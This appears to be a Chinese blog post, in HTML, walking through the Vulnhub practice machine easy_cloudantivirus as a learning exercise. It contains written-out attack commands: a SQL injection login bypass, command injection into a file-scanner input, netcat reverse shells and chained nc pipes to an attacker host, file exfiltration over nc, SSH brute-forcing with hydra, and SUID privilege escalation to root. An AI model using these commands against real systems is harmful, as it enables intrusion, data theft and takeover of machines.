@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="12主机发现for i in $(seq 1 254); do arping -c 1 192.168.31.$i;done;   12端口扫描nmap -p- 192.168.31.14   12服务扫描nmap -sV -p 22,8080 192.168.31.14   访问web8080  需要输入验证码才能登录，两个思路：bp爆破和post注入 top1000跑一遍   暴出密码为pas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶机之easy_cloudantivirus">
+<meta property="og:url" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/index.html">
+<meta property="og:site_name" content="Rsherhan的博客">
+<meta property="og:description" content="12主机发现for i in $(seq 1 254); do arping -c 1 192.168.31.$i;done;   12端口扫描nmap -p- 192.168.31.14   12服务扫描nmap -sV -p 22,8080 192.168.31.14   访问web8080  需要输入验证码才能登录，两个思路：bp爆破和post注入 top1000跑一遍   暴出密码为pas">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161258148.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161413290.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161555269.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161645963.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162142943.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162336861.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162432644.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162826715.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163056812.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163312634.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163636916.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164509365.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164534123.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165142193.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165826025.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165730944.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170108855.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170719185.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172531160.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172736565.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315173119896.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174058726.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174310559.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315175300495.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180228062.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180617583.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181043082.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181716791.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181743441.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315182625865.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315183135386.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204008763.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204049352.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315203819223.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204312378.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204344414.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211236563.png">
+<meta property="og:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211458138.png">
+<meta property="article:published_time" content="2022-03-15T08:08:21.000Z">
+<meta property="article:modified_time" content="2022-03-15T13:22:59.428Z">
+<meta property="article:author" content="Rsherhan">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161258148.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/2/004-32.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/2/001-192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/2/002-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Vulnhub靶机之easy_cloudantivirus</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Rsherhan的博客" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&text=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&is_video=false&description=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub靶机之easy_cloudantivirus&body=Check out this article: http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&name=Vulnhub靶机之easy_cloudantivirus&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&t=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Vulnhub靶机之easy_cloudantivirus
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rsherhan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-15T08:08:21.000Z" itemprop="datePublished">2022-03-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Vulnhub%E9%9D%B6%E6%9C%BA/">Vulnhub靶机</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%89%93%E9%9D%B6/" rel="tag">打靶</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机发现</span><br><span class="line">for i in $(seq 1 254); do arping -c 1 192.168.31.$i;done;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161258148.png" alt="image-20220315161258148"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">端口扫描</span><br><span class="line">nmap -p- 192.168.31.14</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161413290.png" alt="image-20220315161413290"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务扫描</span><br><span class="line">nmap -sV -p 22,8080 192.168.31.14</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161555269.png" alt="image-20220315161555269"></p>
+<p>访问web8080</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161645963.png" alt="image-20220315161645963"></p>
+<p>需要输入验证码才能登录，两个思路：bp爆破和post注入</p>
+<p>top1000跑一遍</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162142943.png" alt="image-20220315162142943"></p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162336861.png" alt="image-20220315162336861"></p>
+<p>暴出密码为password</p>
+<img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162432644.png" alt="image-20220315162432644" style="zoom:80%;">
+
+<p>password登录成功</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png" alt="image-20220315163338369"></p>
+<p>测试一下sql注入</p>
+<p>双引号报错</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162826715.png" alt="image-20220315162826715"></p>
+<img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163056812.png" alt="image-20220315163056812" style="zoom:80%;">
+
+<p>数据库为sqlite3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关键语句</span><br><span class="line">if len(c.execute(&#x27;select * from code where password=&quot;&#x27; + password + &#x27;&quot;&#x27;).fetchall()) &gt; 0:</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造闭合</span><br><span class="line">aaa&quot; or 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163312634.png" alt="image-20220315163312634"></p>
+<p>登录成功</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png" alt="image-20220315163338369"></p>
+<p>一个扫病毒的程序，输入文件名，就会对文件进行扫描</p>
+<p>输入bash扫描结果</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163636916.png" alt="image-20220315163636916"></p>
+<p>构造多条命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.;		分号，命令都会执行		</span><br><span class="line">2.|		管道符，前面执行的输出作为后面命令的输入  </span><br><span class="line">3.&amp;&amp;	与，前面的命令执行成功，才会去执行后面的命令</span><br><span class="line">4.||	或，前面的命令执行失败，才去执行后面的命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164509365.png" alt="image-20220315164509365"></p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164534123.png" alt="image-20220315164534123"></p>
+<p>能够执行命令，尝试反弹，目录中有python和netcat，可尝试python反弹、nc反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash|which nc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165142193.png" alt="image-20220315165142193"></p>
+<p>本地监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
+
+<p>nc反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;nc 192.168.31.125 6666 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>执行命令后本地监听无反应</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165826025.png" alt="image-20220315165826025"></p>
+<p>nc基本都是禁用-e参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;nc 192.168.31.125 6666 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165730944.png" alt="image-20220315165730944"></p>
+<p>nc串联</p>
+<p>本地监听两个端口，一个用来传输命令，一个用来回显</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170108855.png" alt="image-20220315170108855"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash | nc 192.168.31.125 12345 | /bin/bash | nc 192.168.31.125 54321</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170719185.png" alt="image-20220315170719185"></p>
+<p>ls发现存在database.sql文件</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172531160.png" alt="image-20220315172531160"></p>
+<p>查看文件详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file database.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172736565.png" alt="image-20220315172736565"></p>
+<p>通过将文件从目标机传到本地,看一下数据库里有什么好东西</p>
+<p>本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315173119896.png" alt="image-20220315173119896"></p>
+<p>目标机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.31.125 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174058726.png" alt="image-20220315174058726"></p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174310559.png" alt="image-20220315174310559"></p>
+<p>使用kali上的sqlite3查看db.sql文件</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315175300495.png" alt="image-20220315175300495"></p>
+<p>code表只有一个字段password，之前有插入4条密码，而且目标主机开了22端口，可尝爆破</p>
+<p>查看目标主机可登录账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180228062.png" alt="image-20220315180228062"></p>
+<p>三个账户四条密码，做个字典跑一下</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180617583.png" alt="image-20220315180617583"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt ssh://192.168.31.14</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181043082.png" alt="image-20220315181043082"></p>
+<p>没有成功，那就回到nc串联，想办法提权</p>
+<p>找一下suid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181716791.png" alt="image-20220315181716791"></p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181743441.png" alt="image-20220315181743441"></p>
+<p>update_cloudav是由update_cloudav.c编译得到，文件所有这是root，u+s  文件运行的时候会以文件所有者的权限运行，也就是root权限</p>
+<p>查看update_cloudav文件</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315182625865.png" alt="image-20220315182625865"></p>
+<p>随便传了个参数</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315183135386.png" alt="image-20220315183135386"></p>
+<p>再来nc串联</p>
+<p>本地监听</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204008763.png" alt="image-20220315204008763"></p>
+<p>目标机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;aa | nc 192.168.31.125 23456 | /bin/bash | nc 192.168.31.125 65432&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204049352.png" alt="image-20220315204049352"></p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315203819223.png" alt="image-20220315203819223"></p>
+<p>彩蛋</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫目录</span><br><span class="line">dirsearch -u http://192.168.31.14:8080/ </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204312378.png" alt="image-20220315204312378"></p>
+<img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204344414.png" alt="image-20220315204344414" style="zoom: 50%;">
+
+<p>大概意思是进入后台，运行服务器就可以获得PIN</p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211236563.png" alt="image-20220315211236563"></p>
+<p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211458138.png" alt="image-20220315211458138"></p>
+<p>一个交互式控制台，能执行Python代码</p>
+<p>总结：</p>
+<p>web暴力破解获取密码——scanner存在命令执行——nc串联获取shell——suid提权</p>
+<p>sql注入绕过密码进入后台——scanner存在命令执行——Python反弹shell——suid提权</p>
+<hr>
+<p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
